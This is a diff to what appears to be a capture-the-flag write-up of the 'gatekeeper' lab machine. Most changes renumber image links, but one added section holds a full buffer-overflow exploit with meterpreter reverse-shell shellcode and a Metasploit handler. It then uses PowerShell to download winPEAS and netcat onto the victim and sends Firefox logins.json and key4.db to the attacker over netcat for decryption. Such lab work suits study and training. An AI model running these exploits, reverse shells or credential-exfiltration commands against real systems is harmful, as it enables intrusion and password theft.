@@ -10,11 +10,11 @@
 nmap -A $VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
 ### **RPC/**TCP port 135
 
@@ -22,7 +22,7 @@ nmap -A $VICTIM
 rpcclient -U '' $VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
 
 ### **NetBIOS/**TCP port 139
 
@@ -30,7 +30,7 @@ rpcclient -U '' $VICTIM
 nbtscan $VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
 
 ### **SMB/**TCP port 445
 
@@ -44,9 +44,9 @@ smb: \> cd Share
 smb: \Share\> get gatekeeper.exe 
 ```
 
-<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
@@ -57,7 +57,7 @@ xfreerdp /u:admin /p:password /cert:ignore /v:$TESTMACHINE /workarea  +clipboard
 python2 -m SimpleHTTPServer 81
 ```
 
-![](<../../.gitbook/assets/image (6).png>)
+![](<../../.gitbook/assets/image (9).png>)
 
 ### **Crash Replication & Controlling EIP**
 
@@ -70,7 +70,7 @@ python -c 'print("A"* 1000)'
 nc -v $TESTMACHINE 31337
 ```
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 **fuzzer.py**
 
@@ -116,7 +116,7 @@ The fuzzer didn't work as well as it did with other BOF problems. It kept sendin
 python fuzzer.py $VICTIM 1337
 ```
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 **exploit.py**
 
@@ -160,7 +160,7 @@ python exploit.py $VICTIM 1337
 
 
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Finding Bad Characters
 
@@ -226,9 +226,9 @@ except:
 
 
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
-
 <figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 ### Finding a Jump Point
 
@@ -242,7 +242,7 @@ essfunc.dll meets this criteria.&#x20;
 !mona modules
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 We find that essfunc.dll has 2 possible JMP ESPs to use. So we will start with the first one which is 0x080414c3 but when we add it to our code we need it in little endian format so it becomes \xaf\x11\x50\x62.
 
@@ -252,7 +252,7 @@ We find that essfunc.dll has 2 possible JMP ESPs to use. So we will start with t
 !mona find -s "\xff\xe4" -m gatekeeper.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploit - Staging
 
@@ -332,7 +332,7 @@ nc -lvnp 4444
 python exploit.py $TESTMACHINE 31337
 ```
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploit - Production
 
@@ -352,7 +352,162 @@ python exploit.py $VICTIM 31337
 
 
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
+I saw that the Victims OS is x64 and I wasn't able to run exes or powershell so I changed the payload. I first tried x64 payload but it wasn't working because it was to big so I switched to a meterpreter payload to avoid issues running commands.
 
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
+```
+
+#### **exploit.py - Code Changes #3**
+
+```
+import socket, time, sys
+
+try:
+	ip = str(sys.argv[1])
+	port = int(sys.argv[2])
+	print (ip+":"+str(port))
+
+	prefix = ""
+	offset = 146
+	overflow = "A" * offset
+	retn = "\xc3\x14\x04\x08"
+	padding = "\x90" * 16
+	payload = ("\xbf\xcf\x9b\x6b\xd8\xd9\xce\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
+"\x5b\x83\xc3\x04\x31\x7b\x10\x03\x7b\x10\x2d\x6e\x97\x30\x33"
+"\x91\x68\xc1\x53\x1b\x8d\xf0\x53\x7f\xc5\xa3\x63\x0b\x8b\x4f"
+"\x08\x59\x38\xdb\x7c\x76\x4f\x6c\xca\xa0\x7e\x6d\x66\x90\xe1"
+"\xed\x74\xc5\xc1\xcc\xb7\x18\x03\x08\xa5\xd1\x51\xc1\xa2\x44"
+"\x46\x66\xfe\x54\xed\x34\xef\xdc\x12\x8c\x0e\xcc\x84\x86\x49"
+"\xce\x27\x4a\xe2\x47\x30\x8f\xce\x1e\xcb\x7b\xa5\xa0\x1d\xb2"
+"\x46\x0e\x60\x7a\xb5\x4e\xa4\xbd\x25\x25\xdc\xbd\xd8\x3e\x1b"
+"\xbf\x06\xca\xb8\x67\xcd\x6c\x65\x99\x02\xea\xee\x95\xef\x78"
+"\xa8\xb9\xee\xad\xc2\xc6\x7b\x50\x05\x4f\x3f\x77\x81\x0b\xe4"
+"\x16\x90\xf1\x4b\x26\xc2\x59\x34\x82\x88\x74\x21\xbf\xd2\x10"
+"\x86\xf2\xec\xe0\x80\x85\x9f\xd2\x0f\x3e\x08\x5f\xd8\x98\xcf"
+"\xd6\xce\x1a\x1f\x50\x9e\xe4\xa0\xa1\xb7\x22\xf4\xf1\xaf\x83"
+"\x75\x9a\x2f\x2b\xa0\x37\x25\xbb\x41\xc2\xcf\x92\x3e\xd0\x2f"
+"\xf4\xe2\x5d\xc9\xa6\x4a\x0e\x45\x07\x3b\xee\x35\xef\x51\xe1"
+"\x6a\x0f\x5a\x2b\x03\xba\xb5\x82\x7c\x53\x2f\x8f\xf6\xc2\xb0"
+"\x05\x73\xc4\x3b\xac\x84\x8b\xcb\xc5\x96\xfc\xab\x25\x66\xfd"
+"\x59\x26\x0c\xf9\xcb\x71\xb8\x03\x2d\xb5\x67\xfb\x18\xc5\x6f"
+"\x03\xdd\xfc\x04\x32\x4b\x41\x72\x3b\x9b\x41\x82\x6d\xf1\x41"
+"\xea\xc9\xa1\x11\x0f\x16\x7c\x06\x9c\x83\x7f\x7f\x71\x03\xe8"
+"\x7d\xac\x63\xb7\x7e\x9b\xf7\xb0\x81\x5e\xd0\x18\xea\xa0\x60"
+"\x99\xea\xca\x60\xc9\x82\x01\x4e\xe6\x62\xea\x45\xaf\xea\x61"
+"\x08\x1d\x8a\x76\x01\xc3\x12\x77\xa6\xd8\xa5\x02\xc7\xdf\x45"
+"\xf3\xc1\xbb\x45\xf4\xed\xbd\x7a\x23\xd4\xcb\xbd\xf0\x63\xd3"
+"\x23\xdc\x99\x7c\xfa\xb5\x23\xe1\xfd\x60\x67\x1c\x7e\x80\x18"
+"\xdb\x9e\xe1\x1d\xa7\x18\x1a\x6c\xb8\xcc\x1c\xc3\xb9\xc4"
+		)
+	postfix = ""
+
+	buffer = prefix + overflow + retn + padding + payload + postfix
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	try:
+		s.connect((ip, port))
+		print("Sending evil buffer...")
+		s.send(bytes(buffer + "\r\n", "latin-1"))
+		print("Done!")
+	except:
+ 		print("Could not connect.")
+except:
+    print ("\nCould not connect!")
+    sys.exit()
+```
+
+**Kali #1**
+
+```
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost eth0
+set lport 4444
+exploit -j
+```
+
+**Kali #2**
+
+```
+python exploit.py $VICTIM 31337
+```
+
+## Privlege Escalation
+
+```
+meterpreter > run post/windows/gather/enum_applications
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+wget https://github.com/carlospolop/PEASS-ng/releases/download/20221127/winPEASx64.exe 
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim**
+
+```
+cd C:\Users\natbat\Desktop
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.246.169:81/winPEASx64.exe','winPEASx64.exe')" 
+winPEASx64.exe
+```
+
+**Kali**
+
+```
+
+cp /root/Rooms/Follina-MSDT/nc64.exe .
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim**
+
+```
+cd C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\
+cd ljfn812a.default-release
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.246.169:81/nc64.exe','nc64.exe')" 
+```
+
+**Kali**&#x20;
+
+```
+nc -nlvp 1234 > logins.json
+```
+
+**Victim**
+
+```
+nc64.exe -nv 10.10.246.169 1234 < logins.json
+```
+
+**Kali**&#x20;
+
+```
+nc -nlvp 1234 > key4.db 
+```
+
+**Victim**
+
+```
+nc64.exe -nv 10.10.246.169 1234 < key4.db 
+```
+
+**Kali**
+
+```
+git clone https://github.com/lclevy/firepwd.git
+mv key4.db logins.json firepwd/
+cd firepwd/
+pip install -r requirements.txt
+python -m pip install pycryptodome
+
+```
 
